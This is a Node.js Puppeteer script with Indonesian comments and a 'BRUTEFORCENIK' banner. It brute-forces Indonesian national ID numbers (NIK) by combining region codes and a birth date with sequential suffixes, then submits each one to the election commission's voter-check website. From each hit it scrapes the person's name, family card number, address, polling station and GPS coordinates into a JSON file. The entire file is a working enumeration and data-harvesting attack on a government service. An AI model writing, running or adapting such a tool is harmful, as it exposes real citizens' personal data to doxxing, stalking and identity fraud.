import puppeteer from 'puppeteer'
import fs from 'fs'
import path from 'path'
import promptSync from 'prompt-sync'
import { provinsiList } from './provinsi.js'
import { kabkot } from './kabupatenkota.js'
import { kecamatan } from './kecamatan.js' // Tambahkan import kecamatan

const prompt = promptSync()
const outputFile = path.resolve('./hasil.json') // ganti ke .json
const collectedData = []
const start = 0
const length = 100

console.log(`
   ____  ____  __  ________________________  ____  _____________   ________ __
  / __ )/ __ \\/ / / /_  __/ ____/ ____/ __ \\/ __ \\/ ____/ ____/ | / /  _/ //_/
 / __  / /_/ / / / / / / __/ / /_  / / / / / /_/ / /   / __/ /  |/ // // ,<   
/ /_/ / _, _/ /_/ / / / /___/ __/ / /_/ / _, _/ /___/ /___/ /|  // // /| |  
\\____/_/ |_|\\____/ /_/ /_____/_/    \\____/_/ |_|\\____/_____/_/ |_/___/_/ |_|  
`)

// 1. Tampilkan provinsi
console.log("List Provinsi:")
provinsiList.forEach(p => {
  console.log(`${p.kode}: ${p.nama}`)
})

// 2. Input provinsi dengan validasi
const validProvKode = provinsiList.map(p => p.kode)
let provInput
do {
  provInput = prompt('Pilih kode provinsi [NN]: ').trim()
  if (!validProvKode.includes(provInput)) {
    console.log(`Kode provinsi "${provInput}" tidak valid. Silakan coba lagi.`)
  }
} while (!validProvKode.includes(provInput))

const provinsiTerpilih = provinsiList.find(p => p.kode === provInput)
console.log(`Provinsi yang dipilih: ${provinsiTerpilih.nama}`)

// 3. Filter dan tampilkan kabupaten/kota dari provinsi terpilih
const kabkotList = Object.entries(kabkot)
  .filter(([kodeKab, _]) => kodeKab.startsWith(provInput))
  .map(([kodeKab, namaKab]) => ({ kode: kodeKab, nama: namaKab }))

console.log("List Kabupaten/Kota:")
kabkotList.forEach(k => {
  console.log(`${k.kode}: ${k.nama}`)
})

// 4. Input kabupaten/kota dengan validasi
const validKabKode = kabkotList.map(k => k.kode)
let kabInput
do {
  kabInput = prompt('Pilih kode kabupaten/kota [NNNN]: ').trim()
  if (!validKabKode.includes(kabInput)) {
    console.log(`Kode kabupaten/kota "${kabInput}" tidak valid. Silakan coba lagi.`)
  }
} while (!validKabKode.includes(kabInput))

const kabupatenTerpilih = kabkotList.find(k => k.kode === kabInput)
console.log(`Kabupaten/Kota yang dipilih: ${kabupatenTerpilih.nama}`)

// 5. Filter dan tampilkan kecamatan dari kabupaten/kota terpilih
const kecamatanList = Object.entries(kecamatan)
  .filter(([kodeKec, _]) => kodeKec.startsWith(kabInput))
  .map(([kodeKec, namaKec]) => ({ kode: kodeKec, nama: namaKec }))

if (kecamatanList.length === 0) {
  console.log("⚠️ Tidak ada data kecamatan untuk kabupaten/kota ini.")
  process.exit(1)
}

console.log("List Kecamatan:")
kecamatanList.forEach(k => {
  console.log(`${k.kode}: ${k.nama}`)
})

// 6. Input kecamatan dengan validasi
const validKecKode = kecamatanList.map(k => k.kode)
let kecInput
do {
  kecInput = prompt('Pilih kode kecamatan [NNNNNN]: ').trim()
  if (!validKecKode.includes(kecInput)) {
    console.log(`Kode kecamatan "${kecInput}" tidak valid. Silakan coba lagi.`)
  }
} while (!validKecKode.includes(kecInput))

const kecamatanTerpilih = kecamatanList.find(k => k.kode === kecInput)
console.log(`Kecamatan yang dipilih: ${kecamatanTerpilih.nama}`)

// 7. Input tanggal lahir (format: DD-MM-YYYY)
let tanggalLahir
let tanggal, bulan, tahun
do {
  tanggalLahir = prompt('Masukkan tanggal lahir [DD-MM-YYYY]: ').trim()
  const match = tanggalLahir.match(/^(\d{2})-(\d{2})-(\d{4})$/)
  if (match) {
    tanggal = parseInt(match[1], 10)
    bulan = parseInt(match[2], 10)
    tahun = parseInt(match[3], 10)
    if (tanggal >= 1 && tanggal <= 31 && bulan >= 1 && bulan <= 12 && tahun >= 1900 && tahun <= 2099) {
      break
    }
  }
  console.log('Format tanggal lahir tidak valid. Contoh: 17-08-1945')
} while (true)

// 8. Input jenis kelamin (singkat: L/P)
let jenisKelamin
do {
  jenisKelamin = prompt('Jenis kelamin? [L/P]: ').trim().toUpperCase()
  if (jenisKelamin === 'L' || jenisKelamin === 'P') break
  console.log('Input hanya boleh "L" (laki-laki) atau "P" (perempuan)')
} while (true)

// 9. Susun baseNik
const kodeProv = provInput.padStart(2, '0')
const kodeKab = kabInput.slice(2, 4).padStart(2, '0')
const kodeKec = kecInput.slice(4, 6).padStart(2, '0')

let tglNik = tanggal
if (jenisKelamin === 'P') tglNik += 40
const tglNikStr = tglNik.toString().padStart(2, '0')
const blnNikStr = bulan.toString().padStart(2, '0')
const thnNikStr = tahun.toString().slice(-2)

const baseNik = `${kodeProv}${kodeKab}${kodeKec}${tglNikStr}${blnNikStr}${thnNikStr}`

console.log(`baseNik yang digunakan: ${baseNik}`)

async function main() {
  const browser = await puppeteer.launch({ headless: false })
  const page = await browser.newPage()

  for (let i = start; i <= length; i++) {
    const suffix = i.toString().padStart(4, '0')
    const fullNik = baseNik + suffix

    const result = await new Promise(async (resolve) => {
      const timeout = setTimeout(() => {
        resolve(null)
      }, 10000)

      const handleResponse = async (response) => {
        const url = response.url()
        if (url === 'https://cekdptonline.kpu.go.id/v2') {
          try {
            const bodyText = await response.text()
            const json = JSON.parse(bodyText)
            if (json?.data?.findNikSidalih) {
              const data = json.data.findNikSidalih
              clearTimeout(timeout)
              resolve({
                nik : fullNik,
                nama: data.nama,
                nkk: data.nkk,
                kabupaten: data.kabupaten,
                kecamatan: data.kecamatan,
                kelurahan: data.kelurahan,
                tps: data.tps,
                alamat: data.alamat,
                lat: data.lat,
                lon: data.lon
              })
            } else {
              clearTimeout(timeout)
              resolve(null)
            }
          } catch (err) {
            console.error('❌ Gagal parse JSON:', err.message)
            clearTimeout(timeout)
            resolve(null)
          }
        }
      }

      page.removeAllListeners('response')
      page.on('response', handleResponse)

      try {
        await page.goto('https://cekdptonline.kpu.go.id/', {
          waitUntil: 'domcontentloaded'
        })

        await page.waitForSelector('form.av-tooltip input.form-control.is-valid', {
          timeout: 5000
        })

        await page.click('form.av-tooltip input.form-control.is-valid', { clickCount: 3 })
        await page.type('form.av-tooltip input.form-control.is-valid', fullNik)

        const buttonSelector = 'button.btn.btn-primary[style*="position: absolute"]'
        await page.waitForSelector(buttonSelector, { timeout: 5000 })
        await page.click(buttonSelector)
      } catch (error) {
        console.error(`❌ Error NIK ${fullNik}:`, error.message)
        clearTimeout(timeout)
        resolve(null)
      }
    })
    if (result?.nama != null) {
      collectedData.push(result)
      console.log(`✅ Data ditemukan untuk NIK: ${fullNik} - ${result?.nama}`)
    }
    else {
      console.log(`❌ Data tidak ditemukan untuk NIK: ${fullNik}`)
    }

    if (i % 100 === 0) {
      console.log(`📊 Progres: ${i}/${length}`)
    }
  }

  await browser.close()

  if (collectedData.length > 0) {
    fs.writeFileSync(outputFile, JSON.stringify(collectedData, null, 2), 'utf-8')
    console.log(`✅ Berhasil simpan ${collectedData.length} data ke ${outputFile}`)
  } else {
    console.log('⚠️ Tidak ada data ditemukan.')
  }
}

main()
